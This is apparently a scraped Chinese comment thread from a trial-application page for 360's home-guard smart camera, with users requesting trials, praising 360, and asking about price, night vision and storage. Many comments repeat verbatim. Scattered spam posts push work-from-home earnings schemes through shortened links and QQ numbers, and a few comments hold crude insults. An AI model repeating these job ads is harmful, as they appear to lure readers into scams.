陌生人的天敌，孩子的无人值守啊。值得买。希望价格别太贵。
这个好，我准备搞个放幼儿园，随时随地的知道儿子的动态
有外接有线借口么?几个?
嗯嗯，原来99的，有i点坑啊 
特别钟爱小巧精致的物件，看着介绍小蜜的功能蛮多的呢~ 貌似很适合平常总会丢三落四又有点路痴的女人们，嘿嘿，很期待：）
这小玩意很适合我这种丢三落四的妈妈，请给予我试用吧，谢谢
感觉是不错地，
我看没有十五秒，估计一秒都不到，你还真是万中无一的人才啊！11:55-12:10，真的是我眼睛瞎了，还是网速太快了
. .....
好期待啊，今天就公布了
有一个在家，有啥都能看见，就可以放心了
很喜欢！！
几点出结果啊
凑个热闹 大爱360
期待好久的客厅掌控者。。求试用啊。。
太好了这个高科技，上班也可以看到家里的情况，看着孩子和家人，还可以监控有没有小偷，呵呵，很希望得到
保佑成功啊！！！！ 期待结果抽着me！！！！ 最后问下几点出名单啊？？？？
娱乐代步两不误，漫漫长路，慢慢觅归处~~~
只感觉投影时间不错，其他的都是鸡肋
迄今为止，原来我等的其实就是你！
宝宝刚4个月大，婆婆在家带着她，这款360安全卫士希望不要太贵啊，之前看过百度i耳目和联想的看家宝宝小贵没买，一直等着这个，不知道什么时候能申请试用。
科技越来越向电影方向发展了
结果已经公布了。。米有我。。
祈祷。。希望自己能中
期待产品上市，期待试用。再也不用担心小孩在家里的情况了。
360产品 就是牛
老人在家年龄大了又不会用电话不放心，期待试用
最期待的产品
期待啊。。。。。。。
我非常想要360家庭卫士，因为我经常出国、外出，有时一但离开家人久了，家里的事情就会不平衡，有了这个东西，我就可以随时合家人通话看到家人，让家人觉得我就在他们身边，使我和家人身在江湖却心心相连，永远幸福快乐                                 好运砸到我家来啊！到我的碗里去吧！         〖这样我的爱人就不会老催促我回家了。〗^0^
太好了，这个产品真不错。有了它就不用担心猫咪在家里的情况了。希望能得到试用机会
真是居家必备呀，不知道什么时候开始申请试用下呢？
使用温度范围这么小啊，－10～40，这要是万一丢车里。是不是一下报废了
明白为什么是达人了。。赞啊~
一切准备就绪
太好了这个高科技，上班也可以看到家里的情况，看着孩子和家人，还可以监控有没有小偷，呵呵，很希望得到 
下雨天，泥坑路，这玩意脏的还能让人接受么
感觉还是笨重了些，轮子和鞋子主体如果能再小点就好了！
功能完善多些吗？重复性太强了
关注啊，希望能申请成功
赞，人类智慧的结晶
这东西超嗲啊，对于我们这种老忘了把东西放哪的人来说是福音啊，还有可以放车里，那就不用在停车场找车那么麻烦了~
外形超酷，操作简单，功能实用，这个很喜欢，希望可以中~~~~~~
我想买一个
祈祷啊有我吧！ 
 不知道是否支持吊装，如果多个放在同一房间，是否会产生回音？是否可以远程控制哪一个mic可用，哪一个喇叭可用......更多疑问待测
多少钱？？？
已分享，光看参数就十分期待了，希望能够中签试用！
必须让我申请到才行，
对外是否有报警，告警接口？实现远程控制告警......
关注很久很久了， 这个对我来说非常有用，希望申请成功
已购买了儿童卫士，随身WIFI，安全理由，就差这个设备了，期待试用~！
好东东，期待中。。
没有我55555555555555555555555555555555555555555
怎么购买啊？
家里老人自己在家 真的很需要一个啊
什么时候开始卖
要外接供电吗?
今天11点  
还有一小时 
其实 这个我希望可以添加一个功能 当手表 长时间处于水中 或者高温状态是 可以及时发出警报 这个功能实现应该不难  因为最近发生的儿童溺亡时间不在少数
什么时候开始预约？？？
 HIGH 起来 要不要
一直使用360的东东，360随身WiFi，360安全路由，还购买了随身wifi4版，希望这次第一次使用这样新奇的玩意。。。
关注很久很久了， 这个对我来说非常有用，希望申请成
呵呵！是的！
这个东东很抓人眼球的，俺不仅急切地盼望得到试用的机会，更加急切地盼望这个东东不再是卖面条的“肥波阿宝”，而是摇身一变，成长为武林至尊的“功夫熊猫”，不要只打广告，光说不做，早日把这个东东上市销售，当然，不要太贵呦~~~否则俺是买不起的喽
什么时候开始
结果估计马上揭晓
期待360再次给力哦！支持中
“小玩意很适合我这种丢三落四的妈妈”，希望可以送给妈妈！
一个插座，如你所认为的哪样2200W，还玩什么啊。不懂装懂.....
重在参与了解，为科技创新出自己的一份力量，让科技逐步为稳定前进
希望我能体验一次
已购买了360随身WIFI，360安全路由，现在360又出一款吸引眼球的产品了！
这个我想买  很实用  大概价钱 听说过 很合理
一般配一个发烧级电脑 总价十几万很正常 ， 像我们这些平民只能用个六七百的显卡 。
功能单一，与其他品牌的智能手环几乎相同，唯一的好处是电池续航时间长，而且，对于我个人来说存储10小时的锻炼数据没什么用处。
好多功能好像G2都有吧 早出了
这个太棒了  很酷 而且有手环的所有功能，最重要的是解决了屏幕的体积问题 手背就是屏幕 创意太棒了，谁会去嫌弃手背太厚呢？
感觉还是不错的，投影效果好像贾老板主演的时间规划局里的手臂时间一样。其他功能跟现在的智能手表一个性质，一般，有待提高。
平常心，可遇不可求
贵了好多啊 99 149 有什么不同之处吗？ 升级了还是改进了啊 也不说明一下  感觉还在试验阶段的东西 还不是成品呢  
360，你也搞“饥饿”营销？
在哪儿公布的？
做到今天11点
运气成分太大~~重在参与~
一直刷屏等开启
可以快点嘛
希望有报警，告警接口？实现远程控制告警......  
啥时候开始啊
感觉挺不错的，一直想把父母那的摄像头换掉，这样视频聊天就能看清楚双发了。。。
等等等，等到什么时候
得多少钱，想弄个，晚上店没人，感觉不安全，弄个这效果好多了！ 
好定西啊，给我来一个拿
蛮不错的 想试看看
好东西，不错
很有意思。。。
已购买了360随身WIFI，360安全路由，现在360又出一款吸引眼球的产品了！
快点开始呀！ 
好东西不错，
不错，功能很多，试用看看
什么时候开始呢 试用结束有售么，大概多少银子呀
啊啊啊啊啊啊啊啊！快开始！ 
什么时候开始呢
很牛的东西啊！比我的摄像头强大的多了，很心动啊很心动！！！！
太赞了~360真是越来越考虑到大家的安全！这才是真正的安全领导企业！
我也试试哦
么时候开始
好定西啊，给我来一个
什么时候开始啊？心动
希望能实现一带多，并且能够实现简便切换视角，可以保证每一个屋内设置一个探头，避免存在死角。
我也要，快递给我一个吧
坐等开始，憋了好久没买百度和海康了啊。。。
还有十分钟，啊啊啊，好激动O(∩_∩)O~~~~~~~~
想问一下坐车的时候怎么算 是按照静止的时候算睡眠 还是算运动呢？
呵呵呵和 哈哈
希望能实现一带多，并且能够实现简便切换视角，可以保证每一个屋内设置一个探头，避免存在安全隐患
        、、、、严重期待...
我要！一直想买个这东西 ！
我要一个，都别跟我抢
给我给吧！！快递送来把
800多。。。。。
几点开始呢？？
我也想试试！！快递给我吧
还有十分钟 
还是依附于Wi-Fi，要是哪天突然停电或者贼聪慧的切断电源了怎么破
程序员哦，支持个...
来吧来吧,等着
必须要申请一个啊
怎么申请啊 
希望有一个
什么时候开启  我要
我是忠实的粉丝，我需要
期望越大失望也就越大
看起来，感觉不错
我想为家里人准备一个！谢谢
这是好东西啊，很实用的，求试用啊。
期待中......
..好东西
怎么申请啊！！我要一个
来一个吧来一个吧
只有50个啊 
sdssafffffffffffffffffffffffff
这年头 这么诚实做试用的还真是少。 看好你们哦
我也要一个 
你指的是开车的时候吗？ 我没车啊，我坐公交的时候，就不停的晃手.我看算的是运动
好期待啊。。。。
心动，行动，很想试试，希望能申请到
一如既往的支持360的所有产品，实在太实用了，
360涉足家居安防了，不知道多摄像头并发会不会卡，还有家庭带宽上行估计得提高才行。期待...
还有几分钟了，好期望自己能够中
支持360.。。。good
我想为家里人准备一个！申请申请！
希望能实现一带多，并且能够实现简便切换视角，可以保证每一个屋内设置一个探头，避免存在安全隐患 
你想要一个!!真的,家里有老人小孩!!!希望可以得到免费试用啊~支持360
刚刚毕业生，就是做android开发的
刚刚毕业生，就是做android开发的
来一个吧来一个吧 来一个吧来一个吧 来一个吧来一个吧 
来一个吧来一个吧 来一个吧来一个吧 来一个吧来一个吧 
真是那么好，那就很心动，很想试试，希望可以申请到
之前怎么没发现这里有活动！！！！！！！
支持360 希望做的更好 
好东西，我也想要！
正想要去买一个，装家里监控一切，这样家里的什么事情我都能掌握在手里  希望能被选中
貌似很有意思~来一个
不知道什么时候开始啊，，期待中~~~~~~~~~~~~
支持录像吗？
當然，這是无线网卡然后创建wifi热点
當然，這是无线网卡然后创建wifi热点
我好久之前，就希望能有这么一款产品出现，360，你做到了！
给我一个，喜欢。
啥时候开始啊
对于我们来说，很有用，特别希望看见我们不在家的时候狗狗的情况!
看起来真高级。。不知道有没有福能享用啊 
看产品介绍，很喜欢这款产品。希望能申请到试用
这是我的宝贝！！！！！！！！！！！！！！！！！！！我要！！！！！！！！！！
我也想要一个，这样就可以更清晰的看到老爸老妈并和他们通话了，期待。
心动不如行动，小伙伴们速度啊~~~~期待中
不会漏隐私吧
加入电子狗功能就好了
赞赞  喜欢360产品电脑上什么都用360滴   支持！！！！！！！！！！
一直在找这东东。
本人一贯强力支持360系列产品，实用效率高，真心为用户服务！！！点赞！
哇~~~~~~ 这只手表太酷了，我已经戴够了精钢表链的天梭。。。。 希望能得到一只这样的表
我最喜欢这种可爱的小东西，比如360wifi，带动公司的同事买了好几个。我平时比较喜欢丢三落四，希望小蜜能成为我的“贤内助”。
很喜欢，很希望自己能申请到试用资格
我要一个，经常出差家中无人，有了它就有了在家的感觉。 
我也申请一个，这样就可以更清晰的看到老爸老妈了，期待。
我想问家人以及孩子申请一个，求试用
太好了 360 你真棒
不错的产品。高科技
支持，心动，期待中。
赞啊赞    我电脑上什么都用360产品   我需要啊   弄一个360全装！！！！！！！
360牛逼！我老婆生了儿子！我需要监控儿子！送我一个吧
这么棒？？    什么时候开始   卖啊？   
感觉很高科技哦，这么小功能还挺强大，希望能够有好运吧
360的软件老用户了!希望能得到这个试用机会!
支持，心动，期待中。
期待~~~期待~~~~
很多朋友都想自己创业,但是更多的人都不敢迈出第一步,都怕亏损;其实如果你迈出了第一步说不定还会有机会,如果你连第一步都不敢迈出的话,那一点机会都没有! 如果你不满当前的收入想拥有第二份收入，或想给自己以后找一条好的出路，就来我们&quot;下班后创业俱乐部&quot;吧!交流QQ:648149260
一直关注，好想与之会面
一直关注，好想与之会面
我要要要支持360产品 给我带弄一个360全装
如今视频监控实在太猖獗，一不注意就被窥得隐私，现唯有360卫士能捍卫网友的权益 一直都是360卫士的忠实用户，不二之选，简直就是中国的二炮部队；中国人自己网络防护的骄傲；只要是360的产品一定力顶到底！
1点开始啊
很多朋友都想自己创业,但是更多的人都不敢迈出第一步,都怕亏损;其实如果你迈出了第一步说不定还会有机会,如果你连第一步都不敢迈出的话,那一点机会都没有! 如果你不满当前的收入想拥有第二份收入，或想给自己以后找一条好的出路，就来我们&quot;下班后创业俱乐部&quot;吧!交流QQ:648149260
喜欢。。如果有的话就能和家人视频了
很好的设置。就等着360啦
给力。。。。。。。。。。
一直关注，好想与之会面
好想要一个啊，太期待了，我要要要要要要要要要……………………………………
支持   我喜欢家居产品
 不知道有没有福能享用啊 .  
如果你不满当前的收入想拥有第二份收入，或想给自己以后找一条好的出路，就来我们&quot;下班后创业俱乐部&quot;吧!交流QQ:648149260
考不靠谱啊，
 qq592295724不知道有没有福能享用啊   
免费的，我想要
很高端的设备。就等360啦
又一神器，神器收藏狂，顶360！！！！！！！！！
观望了许多品种和型号民，还是这个不错，强烈申请一个
360系列一直看好，给我带来方便。支持，不过对这个摄像头挺感兴趣的 
360牛逼!我老婆生了儿子！我需要监控儿子!送我一个红包吧
期待开启、、、、速度开启。。怕我网速不给力啊
超赞的设计!!! 看来我们即将进入一个在电脑前手舞足蹈的时代了 哈哈哈
我想要一个
高度关注！很实用的产品，早想入手一个。
360的支持者，希望能够试用。
对于其他城市来说 网络是个问题 
360家庭卫士”智能摄像头，主打家庭远程监控功能， 
一如既往的支持360的产品！
360家庭卫士”智能摄像头，主打家庭远程监控功能，
期待能中一个              
很好的一款产品，360一如既往的支持！
还好用，希望可以买一个
还好用，希望可以买一个
好伤心~~~~(&gt;_&lt;)~~~~ 
360的东西果然很强大
╮(╯▽╰)╭
希望可以申请到哦
哇噢...所有的可能都在一步步实现...太炫了.
希望可以申请到哦 
好想要一个啊,希望能中一次！
绝对的360支持者，手机电脑都是装360的，支持！
希望可以申请到   支持360
我想知道中标的   都写了什么   说了  什么     一直好奇
非常想要试用，顶一个
看着好好嗷，好想要一个
360家庭卫士”智能摄像头，主打家庭远程监控功能，
希望能加上远程遥控旋转功能
顶顶顶！！！！
这个感觉真心的实用，适用家中不太懂电脑的老人和孩子，希望有幸可以试用
低性能手机无缘。。。。。。。。。。。。。。。。。
做为一个360老用户 很希望能申请到免费试用 ！！
哼棒  恩  
我没那种命啊   轮也不会轮到我   其实   中不中都没关系   这种活动让你每天都有期待  多刺激   为生活增添色彩
希望是我 呀 
真心期待中，很喜欢360的产品。
如果这个摄像头和体感感应器合成一体那就更好了。这样一样东西可以双面使用，就完美了。
太酷了 太实用了 这样出门宝宝在家放心啊  想试用啊   会极力推荐朋友来关注！！！！
不错不错  支持360 看着很小巧 也很有科技感 我很喜欢
比较新颖的产品
看上去还不错
如果能既能用wifi又能用数据线连接就更好了！！
已经提交申请了     好想中个
希望可以申请到。
这个摄像头的视频可以储存吗
看着很不错的样子
我感觉我应该选不中  要不买一个吧？
家中有小宝宝的对此产品很有兴趣
我用的是360Wi-Fi随身很好用，还帮朋友买了好几个，支持360！
360的产品就是好，我全用的360，希望能申请成功，家庭卫士功能太好了！
看起来非常不错的东东，希望能得到！
希望能有一个接口 我可以设置一个时间段（定时），系统会定时把这个时间段内的视频保存在我的外接移动硬盘里面！！ 我想这个功能很多人都会喜欢，只需要保存到我的外接移动盘就行！！！希望工程狮和程序猿能够给大家实现！
360周边产品也是这么强大啊
加油看好360，***腾讯
有没有很好的东东，希望快点到手
真心想要一个，就算抽不到也希望快点上市，必须去买一个
希望能中！！！
双职工家庭表示很有用
加油支持630
如果如果对手机的要求不是很高的话 就可以考虑给父母也买上
360的产品确实不错，一直在使用。期待更多新产品
不错，我也想用。
希要电脑开机才能用吗？
也不知道多少钱 
很好的产品  贴近生活   会有很多的市场的
很期待啊 希望能申请到
我试用的时候填写了-10度 明明看到的是-5° 汗。。
我想说，可能还会自动监视并录像你输入某些密码的过程。。咳咳，或许我多虑了。毕竟以前有过这类事发生过。。
希要电脑开机才能用吗?
淘宝不是已经有了吗？
360又出神器 希望能得到一个 支持360
希望有幸试用
真的是奇酷无比啊
多么希望拥有啊
希望申请一个，如果申请不到，到哪里能买？
期待购买！
这是我最喜欢的宝贝了，可以照看孩子了
终于开始了，期待中，抽中~~~~
终于开始了，期待中，抽中~~~~
希望能申请到免费试用 ！！
挺                             为什么非要最少5个字啊     
给我一个试用吧。
适合小别墅！非常适合农村小别墅
第一次申请，希望会中
我是做医院信息系统的，这个最适合我们的床头呼叫器！很不错的发明
期待期待期待。来个试试呗
小型企业中应该也挺实用
太伤心了，没我的份
1.可以使用360家庭卫士当作摄像头2.还可以用360进行家庭视频 这样就可以一举两得。 本人认为手机可以实时监控是十分好的，720p的高清视频更有利于看清家庭的细微之处，旋转摄像头更是一大亮点。 重要的是是否有夜拍功能呀？ 场景：在墙壁的角落安装360家庭卫士看清整个房间的一举一动。 对于360家庭卫士最想得到的功能是：实时视频！！！！！ 希望通过！力挺360的产品！！！！！！！！
色彩在丰富些就好了。
非常漂亮！
做为一个360老用户 很希望能申请到免费试用，希望可以申请到，支持360！！！ 
支持，继续加油，出更多更好的产品、
我很支持360希望360可以给我一个试用一下 
好酷！！！！！！
期待啊，快点来到吧 
伤心啊~！
又是360的突发奇想，总让我们有意想不到的惊喜。
360 帅
唉，现在的生活什么都是无限的，360家庭卫士，我挺你！
希望我能试用成功，我特别喜这个，想要得到手！
没份啊~！伤心啊
看上去不错啊。 
先表示下支持~
希望体验一下这个产品
我是360的多年老客户了，我想这个产品不会错了，效果一定会超乎想象，因此急切想试用！！！！
职能加居好帮手
挺好 很期待 
360的产品一直都不错，我都在使用。
非常喜欢GYENNO One 智能手环，没能中，其他试用产品兴趣淡淡啊！ 
使用完还要还回去吗？
希望能申请到免费试用 ！
不管中不中，都支持！求大神来个预定渠道吧！！！
看样子 挺不错的
很好！加油！懒人必备
希望能够申请到，我的电脑里安装的大部分都是360的，我觉得非常好用，360我顶，顶顶顶，给我一个试用吧！
有了360安全卫士，彻底颠覆监控市场，就像360杀毒软件，成为行业的制定者行业排头兵，希望早点上市，希望价格不要太贵，试用名额有限，我就不去抢了，期待早日上市买几个用。
是啊 ，加入电子狗功能吧！
期待期待！！！
我希望奇酷能让我体验一下这个产品，刚提交了试用申请，保佑能通过！
申请了很多期也提了好多意见期望能中
好几期了，给个希望吧
挺你，希望能抽中，希望能给我一个适中，好的话我肯定能推好几个过来一起买
期待一下。能否拥有，无所谓，毕竟是产品，我只希望可以快点购买就好了
已经申请了，静等佳音，阿弥陀佛，3q
期待呦!可以随时看到我的小鸟!
好想要 啊
喜欢 真的很喜欢！希望能够申请到。
为什么没有psp导航系统，因为我是路痴，希望下一期有psp导航系统，O(∩_∩)O~
建议每次填写使用申请时应该绑定手机验证，免得个别人作弊，投机取巧是会影响产品真正的使用效果，怎样对产品的更新和创新不利
好厉害的东东！！！
建议每次填写使用申请时应该绑定手机验证，免得个别人作弊，投机取巧是会影响产品真正的使用效果，怎样对产品的更新和创新不利
我的电脑五年了一直用360的杀毒软件.其他的软件都没有360杀毒软件好用.360好样的我支持你
好想要啊!
好东西，我渴望拥有。
我家宝宝才三个月，我的工作好忙，好想随时都见到宝宝的样子！所以申请了！
很好。你们代表中国的科技发展。谢谢你们、
720P高清。走起 。
期待来试试 
很有创意的东东啊
我想要哪里买的到
没 桑心啊 
让我用吧，以后都买360产品
很喜欢这类产品，值得期待。
期待360家庭卫士早日上市，好想快点买到。
大哥，你的房子是移动城堡吗？
给我一个玩玩
支持~    希望我能试用成功
想尽快收货   体验哈  期待审核通过   非常支持   
好想得到一个哦，这样就可以跟亲朋好友经常联系一下，增进感情，期待！
给我吧，360
牛！这产品肯定能上市中国科技一步步向上走起
东西很不错，等待消息
360的技术是越来越高了。加油吧。支持。
我一向都不喜欢360，手机没安装360，电脑还是别人安装的，，360不好用。。。唯一拯救的方法是，给我用 改变我对360的看法
这也太酷了  
    王八    屁   骗人    
我申请了，希望能拿到！
好想要啊！给我一个呗，试用，我最喜欢了的
努力支持！！
什么时候开始,好期待啊！
希望能得到哦~~~这样和爸爸妈妈就没有距离了
感谢对360家庭卫士的支持，建议已经收集
大爱360 
支持360 已经迫不及待了
对于这个产品我很期待，我很喜欢360家庭卫士的警报通知，这样很增加家里的财产安全，外出的时候就不怕家里会有小偷了
源于生活的东西，很实用很喜欢，很期待360公司再接再厉。
申请了，不知道能不能申请成功！静候佳音！
我也想要  好喜欢
夜间能用吗？？
psp导航是神马？这年头掌机都有这功能了？
加入监控是否家里停电的功能
360操你麻痹
申请了，不是骗人的吧，我申请使用从来没动静。
这设备看着就让人喜欢，即使不能试用，早点上市可以入手也好哇
女友们呼唤有没有隐形版
给我一个吧，亲360
逆天的产品，@360安全卫士，逆天的@周鸿祎
感谢对家庭卫士的支持，小水滴是没有夜视功能的，其他款家庭卫士是可以，期待ing
很期待，360总是给人带来震撼的感觉！ 
非常好的创意，应该会比较火。
孩子放假后单独在家，有了家庭卫士， 这样我就可以知道家中的情况了。
360实在是太强大了，之前出的360WIFI就很好！
感谢对360家庭卫士的支持，建议已经收集
很强大  加油
摄像头防抖性能怎样
那些中了的，不会都是奇酷的内部人员吧！！！！！！！！！！！！！！！
目前市场上已有这类产品，但缺点太多：安装及维护复杂，价格高，实用成本高。导致此类产品在国内销售平平。如果360能解决以上问题，一定能大卖。
求价格和购买方式！
你们别拦我，我要去抢一个
支持360
这个无聊的东西不就是监控吗。。。还是无线的
360一直给人们不错的产品，支持
看了介绍，很心动，抱着试一试的心理申请试用，我相信这个世界充满爱！
360永远支持你们 
不知能不能获得试用权，好像申请的人好多啊。期待中。
赞啊。还能自己手动修。
大爱360，好像要啊
360不断创新，经济适用产品真好。顶一个。
支持360 
家里三个小孩，爸爸妈妈都去上班了，担心他们在家，很想弄个简单点的摄像
这个多少钱啊？
 很有创意，很期待！
“ 规定期限内未提交试用报告者，将被收回试用产品，并取消下期申请资格”，我想知道如果我定期第一次交了报告，以后还需要定期 提交报告吗？？要提交多少次的报告呢？？
很喜欢360_奇酷这种方式 这将成为一种潮流 是一种历史趋势 衷心祝愿奇酷越办越红火 引领一代潮流！！！ 
360全心全意为国民
太有才了。
清晰度能不能高一些，1080P?
好东西不错 
感谢对360家庭卫士的支持，祝家庭幸福~
以后再也不怕隔壁老王了
以后再也不怕隔壁老王了
功能很实用 永远支持360
白天上班，家里就只有老人，岁数大了，身体不好，很是不放心啊，有了这个就可以时刻观察下，又不用总打电话打扰，挺好啊，期待
期待，，，，，
支持360的新研成果和构思，相信360明天会更好
这个好好玩啊。要是能做出来还是挺炫酷的。
 太好了， 大爱360 ，希望给我一个
非常想拥有一个，可以在离家的时候时刻了解宝宝在家的一举一动
为什么不做隐形的那样多好 这个摄像头人家会容易发现   有啥用
说的不清大楚的zzzz
功能很实用 永远支持360  
希望能申请到，这样就可以天天看家里的宝宝了
希望应用软件能令我满意.
这个我喜欢只要不太贵应该会买的
你们就想过手表会转来转去的吗
360就是比腾讯省心，也用得放心，不用花钱开特权，就能享受一系列贴心服务，you are very good！
我想要，360的东西都很靠谱
着东西不错~提高孩子的开发能力
说的这么好！不知到底咋样 已申领！若不中 考虑买一个用用！
功能实用 支持360
功能看起来比较不错，但是不知道实际效果如何，如果能达到描述所说的，那就相当不错，但是不希望价格太高！很期待，在关注
这个好啊~放在床上边听边..你们懂得呵呵
360家庭卫士很智能，很期待。
360的东西不错
sbsbsbsb 
有了它就可以拍我孩子们的可爱瞬间了，平时我外出多不知道孩子那么可爱，昨天回家才发现孩子们哪么可爱，我家有俩孩子经常有好玩的事情但我不可以看到有了它就可以看到了。多多支持360吧
就是没有机会试试啊
这么高端~以后不担心花渴死了
等待   等待 快
抽我抽我！！
真好啊360全心全意为国民 太有才了很喜欢360_奇酷这种方式 这将成为一种潮流 是一种历史趋势 衷心祝愿奇酷越办越红火 引领一代潮流！！！
是免邮的吗？
非常支持360家庭卫士摄像头，更支持360.谢谢
是免邮的吗？
强大，厉害啊！
360我看行！ 
快点出手我买几个 老丢东西
我爱360
360值得关注信赖
360的产品我不担心有后门存在，最起码我现在电脑和手机都是用360的软件。如果不能够***以后买一个。用起放心写。安全有保证
360的产品我不担心有后门存在，最起码我现在电脑和手机都是用360的软件。如果不能够***以后买一个。用起放心写。安全有保证
不知道可不可以吸到房顶
360家庭卫士——美好家园的缔造者者！科技时代让世界变得更小，让家变的更贴近。最关注的是360家庭卫士的实时视频和语音通话功能。家是我们温馨的港湾，360是我最忠实的守护神！   真心期待幸运女神的眷顾，能申请到期待已久的360家庭卫士。永远支持360！！！
很好很强大
在忙碌和重压的现实生活状态中，家中拥有360家庭卫士，可以让忙碌的工作中的我们随时随地实时了解家中的一切，随时可视聊天，关心家中年迈的父母和吱呀学话的宝宝，可以随时观察到家中的一切状态。让家变得更温馨，更安全。
在忙碌和重压的现实生活状态中，家中拥有360家庭卫士，可以让忙碌的工作中的我们随时随地实时了解家中的一切，随时可视聊天，关心家中年迈的父母和吱呀学话的宝宝，可以随时观察到家中的一切状态。让家变得更温馨，更安全。
小小的申请了下，表示东西描述很好，给我试用我才知道
还没有试用个。希望产品与事实接轨
有了这个东西，相信就不会迷失方向了。
这才叫创新！！！！很好啊真正的把中国制造变成了中国创造！！！！很好！！！！！！
好东西  可以在办公室一试
在忙碌和重压的现实生活状态中，家中拥有360家庭卫士，可以让忙碌的工作中的我们随时随地实时了解家中的一切，随时可视聊天，关心家中年迈的父母和吱呀学话的宝宝，可以随时观察到家中的一切状态。让家变得更温馨，更安全。
在忙碌和重压的现实生活状态中，家中拥有360家庭卫士，可以让忙碌的工作中的我们随时随地实时了解家中的一切，随时可视聊天，关心家中年迈的父母和吱呀学话的宝宝，可以随时观察到家中的一切状态。让家变得更温馨，更安全。
在忙碌和重压的现实生活状态中，家中拥有360家庭卫士，可以让忙碌的工作中的我们随时随地实时了解家中的一切，随时可视聊天，关心家中年迈的父母和吱呀学话的宝宝，可以随时观察到家中的一切状态。让家变得更温馨，更安全。
在忙碌和重压的现实生活状态中，家中拥有360家庭卫士，可以让忙碌的工作中的我们随时随地实时了解家中的一切，随时可视聊天，关心家中年迈的父母和吱呀学话的宝宝，可以随时观察到家中的一切状态。让家变得更温馨，更安全。
在忙碌和重压的现实生活状态中，家中拥有360家庭卫士，可以让忙碌的工作中的我们随时随地实时了解家中的一切，随时可视聊天，关心家中年迈的父母和吱呀学话的宝宝，可以随时观察到家中的一切状态。让家变得更温馨，更安全。
永远支持360    360用实力见证    你们绝对会的更好    很期待这次试用机会
在忙碌和重压的现实生活状态中，家中拥有360家庭卫士，可以让忙碌的工作中的我们随时随地实时了解家中的一切，随时可视聊天，关心家中年迈的父母和吱呀学话的宝宝，可以随时观察到家中的一切状态。让家变得更温馨，更安全。
只是想知道这个的效果怎么样，有没有小度i耳目的好，期待惊喜！！
好东西，尽快上市！
不错，很有创新感
360一直给人们不错的产品，很强大 加油 
期待。。。
以人为本，真正为老百姓着想！360，我看行！
360wifi就是一个路由器 插在台式电脑上很方便，但笔记本的话自身带有路由器你可以自己设置共享，用这个360wifi没用，上述图片中没有台式电脑，我猜台式电脑上不能用   360就是一个骗子
挺( ^_^ )不错嘛
超实用，有了它，就算不在家，对家中的一切也了如指掌，再也不用担心家中的安全了
什么后门，即使有我也愿意，我信懒360！
好多人申请，呵呵，，加油
在这里准确的说     没宽带不行
还没有试用个。希望产品与事实接轨 
不知道会不会好用？？？？？
涨价了？不是99吗？难道又改进了？
好啊  我喜欢 懒人必备。。
太给力了  随时随地能看见家里的宝宝
想试用如何
点滴之中，传递正能量
30名幸运儿诞生了，恭喜哦！期待下期自己也有好运哦！
这个用在店铺也很好，警报一响，马上接通报警，
第一张图片不是自己的吧！
在忙碌和重压的现实生活状态中，家中拥有360家庭卫士，可以让忙碌的工作中的我们随时随地实时了解家中的一切，随时可视聊天，关心家中年迈的父母和吱呀学话的宝宝，可以随时观察到家中的一切状态。最关注的是360家庭卫士的实时视频和语音通话功能。 真心期待幸运女神的眷顾，能申请到期待已久的360家庭卫士。永远支持360！！！
家是我们温馨的港湾，360是我最忠实的守护神！
家是我们温馨的港湾，360是我最忠实的守护神！
不想得便宜,只想买一个,这样痛快.只是不知多少钱能买到?希望尽早上市!
360智能摄像头功能有哪些呢, 1/实时视频，用户可以使用手机随时随地远程实时查看家中情况,确保家庭安全。2、语音通话，该摄像头内置了麦克风和扬声器，用户可以随时与家人双向语音通话。3/报警通知，一旦家中出现物品移动，声音异常等情况便会发送报警信息到手机上，4、存储方面，360提供7*24小时的云录像，可以以720P画质存储。
360我们大家~小家~自己家的卫士专家
多少钱一个啊
户外强光下就是渣，小众产品 售价肯定不会滴且不使用
360家庭卫士——美好家园的缔造者者！科技时代让世界变得更小，让家变的更贴近。最关注的是360家庭卫士的实时视频和语音通话功能。家是我们温馨的港湾，360是我最忠实的守护神！ 真心期待幸运女神的眷顾，能申请到期待已久的360家庭卫士。永远支持360！！！
我就在用360WIFI，再来一个WIFI连接摄像头就更棒了。
很期待我的申请！！
不错，挺实用的。望尽快上市。
好想要个，永远支持360~ 
qiand jie la
期待呦!可以随时看到我的宝贝
该不会是骗售吧
加把劲今天就把名额占满
360总是给人惊喜！！！
酷，，，，，
好东西。。。。
一如既往的支持360，好样的
支持360......
请问要钱吗
上次抢了一个啊
期待我申请的试用机会能通过！每次我都非常期待360的产品。每次的产品总能给我们惊喜！
准备再抢一个
外观很好看，不会像其他品牌的那么难看
此职位可以在家工作，无论你是宝妈，办公室职员，学生，宅男宅女都可以来做，曰收40-100左右，薪水曰结，有意者博客联系我 【 http://t.cn/8sfyr3p】复制到浏览器打开～我详细作讲解～
～给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班族都可以） 扣：23～603～76909
呵呵。值的推荐。
～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）～～ 
环保产品，值得期待和推广。
我是360的粉丝用360产品十来年了，相信你们做的很贴心。特别期待我能成为试用的一员。
http://t.cn/8sfyr3p
～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以） ～每夭5o~15o，我详细作讲解～有意者博客联系我  http://t.cn/8sfyr3p
此职位可以在家工作，不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～
好东西，360推出的东西真是实用
看起来不错……
酷爆了，不知道用起来怎么样
建议可以内插sd卡或者直接和云盘绑定直接将录像上传到云盘，方便回放和事故取证等 谁也不可能天天拿着手机在哪看着吧！客户端最好出一个pc端 这样大人可以边上班变看孩子在家是在写作业还是打游戏~~
此职位可以在家工作，不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】复制到浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～
爷爷患了癌症，需要24小时有人看护，如果有了这个，奶奶和姑姑就不用寸步不离的一直守着他
不错哦，虽然图片有点少，不过至少证明你说的是真的，还有哈，你的报告都是你自己的语言，不像别人都是复制的，支持楼主哦，
我申请了。期待能给我提供试用的机会
多少钱一个
怎莫看自己中没中
